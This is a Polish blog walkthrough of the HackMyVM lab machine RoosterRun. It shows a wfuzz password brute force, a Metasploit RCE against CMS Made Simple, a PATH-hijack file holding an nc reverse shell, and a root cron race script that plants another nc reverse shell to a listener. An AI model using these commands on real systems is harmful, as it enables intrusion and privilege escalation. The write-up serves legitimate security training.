---
title: "RoosterRun - Cromiphi"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - RoosterRun
header:
  overlay_image: /assets/images/pasek-hack.png
---
# RoosterRun - cromiphi
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Nazwa:|RoosterRun|
|Autor:|[cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)|
|Wypuszczony:|2023-11-28|
|Ściągnij:|[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=RoosterRun)|
|Poziom:||
|System:|Linux|
|Nauczysz się:|Szybkiego biegania kogutów ;) CVE, RevShell, bruteforce |

# 01. Wstęp
Kolejna maszynka od **Cromiphi** - znany twórcy maszynek do łamania, który dużo ich zrobił dla **HackMyVM**. To miała być łatwa maszynka, jednak zaliczyłbym ją raczej do średnich. Ma swoje ciekawe momenty, które mogą przystopować na dłużej. Do tego nie jest na parę minut, jakby się mogło komuś wydawać. Jeżeli zaczynasz zabawę z łamananiem, to bez wskazówek możesz się długo z nią męczyć (ale warto). Ip maszyny, jak zwykle wykryłem dzięki programowi **netdiscover**, ale ostatnio twórcy sami umieszczają adres na ekranie konsoli obrazu. Ostatnio obrazy odpalam w **Virtual Boxie**, ale zazwyczaj nie ruszają. Wystarczy odpowiednio ustawić sieciówkę i potem zazwyczaj wszystko rusza.
{: .text-justify}
![01](/assets/images/hacking/2023/05/01.png)
{: .text-justify}
# 02. Co to za maszyna?
Po wstępnym skanowaniu **nmapem**:
{: .text-justify}
```bash
msf6 > db_nmap 172.16.1.227
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-28 22:20 CET
[*] Nmap: Nmap scan report for rooSter-Run.lan (172.16.1.227)
[*] Nmap: Host is up (0.00081s latency).
[*] Nmap: Not shown: 998 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE
[*] Nmap: 22/tcp open  ssh
[*] Nmap: 80/tcp open  http
[*] Nmap: MAC Address: 08:00:27:82:3B:50 (Oracle VirtualBox virtual NIC)
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
msf6 > hosts 

Hosts
=====

address       mac                name             os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----             -------  ---------  -----  -------  ----  --------
172.16.1.227  08:00:27:82:3b:50  rooSter-Run.lan  Unknown                    device
```
widzimy, że mamy otwarte porty: 
{: .text-justify}
- **22/tcp** - SSH
- **80/tcp** - Apache WWW

Czyli standard. Wchodząc przez przeglądarkę jest jakiś CMS - [CMS - Made simple](http://www.cmsmadesimple.org/). Trochę połaziłem po stronie, ale nic ciekawego nie było, co by się potem przydało. **Feroxbuster** i **Dirsearch** wyrzuciły dużo linków, ale znalazły mało przydatnych rzeczy (no, może poza linkiem do logowania i wersją CMS-a). A to też jest ważna wskazówka (że prawie nic nie znaleziono). Później poszukałem na necie i zobaczyłem, że główny użytkownik to **admin**(jak zwykle :smiley: ). Logowanie typu **admin**/**admin** itp. oczywiście nie działało, więc trzeba było inaczej znaleźć hasełko.
{: .text-justify}
![02](/assets/images/hacking/2023/05/02.png)
{: .text-justify}
# 03. Szukanie hasełka dla admina
Do łamania haseł online dobry jest **Ffuf** i **Wfuzz**. Niestety w **Ffuf** trzeba podawać jakieś dodatkowe parametry nagłówka, żeby dobrze znajdował. **Wfuzz** tego problemu już nie ma. Dodatkowa komplikacja jest z trudnością hasła. Niestety jest głównie w **rockyou.txt** i na dosyć dalekiej pozycji (19993), więc trochę czasu minie zanim program je znajdzie. 
{: .text-justify}
```bash
wfuzz -w /usr/share/wordlists/rockyou.txt -d 'username=admin&password=FUZZ&loginsubmit=Submit' -u http://172.16.1.227/admin/login.php --hh 4569
```
```bash
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.16.1.227/admin/login.php
Total requests: 14344392

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                              
=====================================================================

000019993:   302        0 L      0 W        0 Ch        
"hasełko"
```
# 04. Podatna wersja CMS Made Simple
Jak wcześniej napisałem jest to **CMS Made Simple**, a jego wersja to **2.2.9.1**. Szukając podatności w **Metasploicie** znalazłem coś takiego:
{: .text-justify}
```bash
msf6 > search CMS Made Simple

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/cmsms_showtime2_rce         2019-03-11       normal     Yes    CMS Made Simple (CMSMS) Showtime2 File Upload RCE
   1  exploit/multi/http/cmsms_upload_rename_rce     2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
   2  exploit/multi/http/cmsms_object_injection_rce  2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection


Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/http/cmsms_object_injection_rce
```
Wybieramy __multi/http/cmsms_object_injection_rce__:
```bash
msf6 exploit(multi/http/cmsms_object_injection_rce) > set username admin
username => admin
msf6 exploit(multi/http/cmsms_object_injection_rce) > set password hasełko
password => hasełko
msf6 exploit(multi/http/cmsms_object_injection_rce) > set rhosts 172.16.1.227
rhosts => 172.16.1.227
msf6 exploit(multi/http/cmsms_object_injection_rce) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.1.89:4444 
msf6 exploit(multi/http/cmsms_object_injection_rce) > [*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Sending stage (39927 bytes) to 172.16.1.227
[+] Deleted zEAhHHutjN.php
[*] Meterpreter session 1 opened (172.16.1.89:4444 -> 172.16.1.227:41228) at 2023-11-28 23:06:33 +0100

msf6 exploit(multi/http/cmsms_object_injection_rce) > 
```
W w/w eksploicie jest wymagane podania loginu i hasła, ale za to mamy dostęp do **Shella**.
{: .text-justify}
# 05. Użytkownik www-data
Wchodząc na shella działamy na użytkowniku **www-data**, ale jest jeszcze drugi "ludź" w katalogu **home** - **matthieu**. Trochę autor powrzucał na maszynę króliczych nor i różnej maści zmyłek, ale ważny jest skrypt **StaleFinder** i katalog **/usr/local/bin**. Jest on pusty, co nasuwa pewne przypuszczenie.
{: .text-justify}
```bash
www-data@rooSter-Run:/home/matthieu$ getfacl /usr/local/bin
getfacl /usr/local/bin
getfacl: Removing leading '/' from absolute path names
# file: usr/local/bin
# owner: root
# group: root
user::rwx
user:www-data:rwx
user:matthieu:r-x
group::---
mask::rwx
other::---
```
Jak widzimy, użytkownik **www-data** ma cały dostęp do tego katalogu. Skrypt **StaleFinder** zaś wygląda tak:
{: .text-justify}
```bash
#!/usr/bin/env bash

for file in ~/*; do
    if [[ -f $file ]]; then
        if [[ ! -s $file ]]; then
            echo "$file is empty."
        fi
        
        if [[ $(find "$file" -mtime +365 -print) ]]; then
            echo "$file hasn't been modified for over a year."
        fi
    fi
done
```
Sprawdźmy kolejność przeszukiwania katalogów przez **Basha**(zakładając, że **matthieu** ma tak samo):
{: .text-justify}
```bash
www-data@rooSter-Run:/home/matthieu$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Zobaczmy gdzie jest **Bash**:
{: .text-justify}
```bash
whereis bash
bash: /usr/bin/bash /usr/share/man/man1/bash.1.gz
```
Katalog **/usr/bin/** jest za **/usr/local/bin**, więc jeżeli wrzucimy nasz plik **bash** do katalogu **/usr/local/bin** to się uruchomi pierwszy. Zawartość jego to oczywiście **Reverse Shell**. 
{: .text-justify}
Zawartość pliku:
{: .text-justify}
```bash
nc -c /bin/bash 172.16.1.89 12345
```
# 05. Użytkownik matthieu
Będąc już na koncie **matthieu** odpalamy program **Lse** (wcześniej też to było zalecane, żeby znaleźć ciekawą ścieżkę **/usr/local/bin**).
```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" && chmod 700 lse.sh && ./lse.sh -l 1
```
Poniżej jest interesujący nas fragment:
{: .text-justify}
![03](/assets/images/hacking/2023/05/03.png)
{: .text-justify}
# 06. Ruster Run
I tu zaczynają się schody, oraz ten **wyścig kogutów**, które zabrały mi troche czasu. Pomógł mi **Ethicrash** i gdzieś widziałem wcześniej podobną sztuczkę na maszynie od **RiJaba1** (niekoniecznie tak samo, ale...), ale po kolei. W Katalogu **/opt/maintenance** mamy skrypt **backup.sh**, który jest wykonywany co minutę przez **crontab** z konta **Roota**.
{: .text-justify}
```bash
#!/bin/bash

PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"


for file in "$PREPROD"/*; do
  if [[ -f $file && "${file##*.}" = "sh" ]]; then
    cp "$file" "$PROD"
  else
    rm -f ${file}
  fi
done

for file in "$PROD"/*; do
  if [[ -f $file && ! -O $file ]]; then
  rm ${file}
  fi
done

/usr/bin/run-parts /opt/maintenance/prod-tasks
```
Z katalogu **/opt/maintenance/pre-prod-tasks** są przerzucane pliki do katalogu **/opt/maintenance/prod-tasks**, a następnie za pomocą **run-parts** uruchamiane są wszystkie programy. Wydaje się to proste. Wrzućmy pliki, a skrypt skopiuje z uprawnieniami roota i je wykona. Niestety, skrypt kopiuje tylko pliki z rozszerzeniem **.sh**, a tych plików tutaj nie uruchamia **run-parts**. Będąc w katalogu **/opt/maintenance/prod-tasks** kopiowałem pliki komendą **cp**, ale plik zmieniał właściciela na **matthieu**, a na tym nam nie zależy. Jednak później spróbowałem komendą mv i... jest sukces. Plik nie zmienił właściciela, był nim **root**, a na roocie można było odpalić kolejną konsolkę. Poniżej jest skrypt który uruchom. Wrzuci plik **file.sh** do katalogu **/opt/maintenance/pre-prod-tasks**. Przy okazji odpal u siebie następną konsolkę nasłuchującą. Poniżej skrypt:
{: .text-justify}
```bash
#!/bin/sh
PROD="/opt/maintenance/prod-tasks"
PREPROD="/opt/maintenance/pre-prod-tasks"
FILE=file.sh
echo '#!/bin/sh' > $PREPROD/file.sh
echo 'nc -c /bin/sh 172.16.1.89 44444' >> $PREPROD/file.sh
chmod +x $PREPROD/file.sh
```
Później wejdź do katalogu **/opt/maintenance/prod-tasks** i czekaj aż tam będzie **file.sh**. Następną operacją jest zmiana nazwy komendą **mv**. *mv file.sh file*. Po niecałej minucie powinieneś mieć dostęp do konta **Root**.
{: .text-justify}